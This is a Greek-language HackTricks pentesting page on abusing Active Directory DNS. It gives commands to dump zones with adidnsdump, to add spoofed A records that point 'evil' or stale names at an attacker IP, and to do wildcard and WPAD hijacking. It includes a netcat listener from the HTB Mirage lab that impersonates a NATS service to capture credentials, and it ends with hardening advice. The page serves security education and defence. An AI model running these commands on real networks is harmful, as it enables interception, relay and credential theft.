# Εγγραφές DNS AD

{{#include ../../banners/hacktricks-training.md}}

Από προεπιλογή, **κάθε χρήστης** στο Active Directory μπορεί να **απαριθμήσει όλες τις εγγραφές DNS** στις ζώνες DNS του Domain ή του Forest, όπως σε ένα zone transfer (οι χρήστες μπορούν να εμφανίσουν τα θυγατρικά αντικείμενα μιας ζώνης DNS σε περιβάλλον AD).

Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **απαρίθμηση** και την **εξαγωγή** **όλων των εγγραφών DNS** της ζώνης για σκοπούς recon εσωτερικών δικτύων.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει έξοδο JSON/Greppable (`--json`), πολυνηματική επίλυση DNS και υποστήριξη TLS 1.2/1.3 κατά τη σύνδεση σε LDAPS  

Για περισσότερες πληροφορίες, διαβάστε το [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Δημιουργία / Τροποποίηση εγγραφών (ADIDNS spoofing)

Επειδή η ομάδα **Authenticated Users** έχει από προεπιλογή δικαίωμα **Create Child** στο DACL της ζώνης, οποιοσδήποτε λογαριασμός τομέα (ή υπολογιστή) μπορεί να καταχωρίσει πρόσθετες εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για υποκλοπή κίνησης, εξαναγκασμό NTLM relay ή ακόμα και πλήρη παραβίαση του τομέα.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(το dnsupdate.py περιλαμβάνεται στο Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Συνήθεις βασικές τεχνικές επίθεσης

1. **Εγγραφή wildcard** – το `*.<zone>` μετατρέπει τον AD DNS server σε responder για ολόκληρη την επιχείρηση, παρόμοιο με την πλαστογράφηση LLMNR/NBNS. Μπορεί να γίνει κατάχρηση για την υποκλοπή NTLM hashes ή την αναμετάδοσή τους σε LDAP/SMB.  (Απαιτείται να είναι απενεργοποιημένο το WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **Κατάληψη WPAD** – προσθέστε `wpad` (ή μια εγγραφή **NS** που δείχνει σε host του επιτιθέμενου, για να παρακαμφθεί το Global-Query-Block-List) και διαμεσολαβήστε διαφανώς τα εξερχόμενα HTTP requests για να συλλέξετε διαπιστευτήρια. Η Microsoft διόρθωσε τις παρακάμψεις wildcard/DNAME (CVE-2018-8320), αλλά οι **εγγραφές NS εξακολουθούν να λειτουργούν**.<sup>[[1]](#references)</sup>    
3. **Κατάληψη παρωχημένης εγγραφής** – διεκδικήστε τη διεύθυνση IP που ανήκε προηγουμένως σε έναν σταθμό εργασίας· η αντίστοιχη εγγραφή DNS θα εξακολουθήσει να επιλύεται, επιτρέποντας επιθέσεις resource-based constrained delegation ή Shadow-Credentials χωρίς να αγγίξετε καθόλου το DNS.    
4. **Πλαστογράφηση DHCP → DNS** – σε μια προεπιλεγμένη εγκατάσταση Windows DHCP+DNS, ένας μη πιστοποιημένος επιτιθέμενος στο ίδιο subnet μπορεί να αντικαταστήσει οποιαδήποτε υπάρχουσα εγγραφή A (συμπεριλαμβανομένων των Domain Controllers), στέλνοντας πλαστά DHCP requests που ενεργοποιούν δυναμικές ενημερώσεις DNS (Akamai «DDSpoof», 2023).  Αυτό επιτρέπει επίθεση machine-in-the-middle μέσω Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη κατάληψη του domain.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός machine account που ελέγχετε, καταχωρίστε μια αντίστοιχη εγγραφή A και, στη συνέχεια, ζητήστε πιστοποιητικό για αυτό το όνομα ώστε να υποδυθείτε τον DC. Εργαλεία όπως τα **Certipy** ή **BloodyAD** αυτοματοποιούν πλήρως τη διαδικασία.  

Μια εγγραφή AD DNS με [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) μπορεί να αποτελεί μέρος μιας αλυσιδωτής επίθεσης relay υπό προϋποθέσεις: ο καλών χρειάζεται δικαιώματα δημιουργίας εγγραφών, μια διαδρομή coercion που αναγκάζει τον υπολογιστή-στόχο να πιστοποιηθεί σε αυτό το όνομα και έναν προορισμό relay που δέχεται το αποτέλεσμα του authentication. Αξιολογήστε ξεχωριστά το πρωτόκολλο προορισμού· το SMB signing στην εισερχόμενη σύνδεση δεν καθορίζει από μόνο του αν ένας προορισμός HTTPS WinRM δέχεται το relay. Το επίπεδο ενημερώσεων, ο χειρισμός ονομάτων, το Extended Protection και η διαμόρφωση της υπηρεσίας μπορούν να επηρεάσουν το αποτέλεσμα.

---

### Κατάληψη εσωτερικής υπηρεσίας μέσω παρωχημένων δυναμικών εγγραφών (μελέτη περίπτωσης NATS)

Όταν οι δυναμικές ενημερώσεις παραμένουν διαθέσιμες σε όλους τους πιστοποιημένους χρήστες, **ένα όνομα υπηρεσίας που έχει καταργηθεί μπορεί να διεκδικηθεί ξανά και να δείχνει σε υποδομή του επιτιθέμενου**. Ο DC του Mirage HTB αποκάλυψε το hostname `nats-svc.mirage.htb` μετά το DNS scavenging, οπότε οποιοσδήποτε χρήστης με χαμηλά προνόμια μπορούσε να:<sup>[[3]](#references)</sup>

1. **Επιβεβαιώσει ότι λείπει η εγγραφή** και να εντοπίσει το SOA με `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Αναδημιουργήστε την εγγραφή** προς μια εξωτερική διεπαφή/VPN που ελέγχουν:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Μιμηθείτε την υπηρεσία plaintext**. Οι clients του NATS αναμένουν να δουν ένα banner `INFO { ... }` πριν στείλουν διαπιστευτήρια, οπότε αρκεί να αντιγράψετε ένα νόμιμο banner από τον πραγματικό broker για να υποκλέψετε μυστικά:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Οποιοσδήποτε client επιλύσει το hijacked όνομα θα κάνει αμέσως leak το JSON frame `CONNECT` (συμπεριλαμβανομένων των `"user"`/`"pass"`) στον listener. Η εκτέλεση του επίσημου binary `nats-server -V` στο host του attacker, η απενεργοποίηση της απόκρυψης δεδομένων στα logs του ή απλώς η καταγραφή της συνεδρίας με το Wireshark αποκαλύπτουν τα ίδια credentials σε plaintext, επειδή το TLS ήταν προαιρετικό.

4. **Pivot με τα captured creds** – στο Mirage, ο κλεμμένος λογαριασμός NATS παρείχε πρόσβαση στο JetStream, όπου υπήρχαν ιστορικά συμβάντα authentication με επαναχρησιμοποιήσιμα AD usernames/passwords.

Αυτό το μοτίβο ισχύει για κάθε υπηρεσία που είναι ενσωματωμένη στο AD και βασίζεται σε μη ασφαλή TCP handshakes (HTTP APIs, RPC, MQTT κ.λπ.): μόλις γίνει hijack του DNS record, ο attacker γίνεται η υπηρεσία.

---

## Εντοπισμός και ενίσχυση ασφάλειας

* Αφαίρεσε από τους **Authenticated Users** το δικαίωμα *Create all child objects* σε ευαίσθητες ζώνες και ανάθεσε τις dynamic updates σε έναν αποκλειστικό λογαριασμό που χρησιμοποιεί το DHCP.
* Αν απαιτούνται dynamic updates, όρισε τη ζώνη σε **Secure-only** και ενεργοποίησε το **Name Protection** στο DHCP, ώστε μόνο το αντικείμενο υπολογιστή που είναι ιδιοκτήτης της εγγραφής να μπορεί να την αντικαταστήσει.
* Παρακολούθησε τα DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) και τις εγγραφές LDAP στο `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Μπλόκαρε επικίνδυνα ονόματα (`wpad`, `isatap`, `*`) με μια σκόπιμα αβλαβή εγγραφή ή μέσω του Global Query Block List.
* Διατήρησε τους DNS servers ενημερωμένους με patches – π.χ., τα RCE bugs CVE-2024-26224 και CVE-2024-26231 έφτασαν το **CVSS 9.8** και μπορούν να γίνουν αντικείμενο απομακρυσμένης εκμετάλλευσης σε Domain Controllers.  

## References

- [1] [Το ADIDNS ξανά στο προσκήνιο - WPAD, GQBL και άλλα](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Πλαστογράφηση DNS records μέσω κατάχρησης των δυναμικών ενημερώσεων DNS του DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Αλυσίδα επιθέσεων με NFS Leaks, κατάχρηση Dynamic DNS, κλοπή NATS credentials, μυστικά JetStream και Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Μπαίνοντας στη ζώνη: απόρριψη δεδομένων DNS του Active Directory με το adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
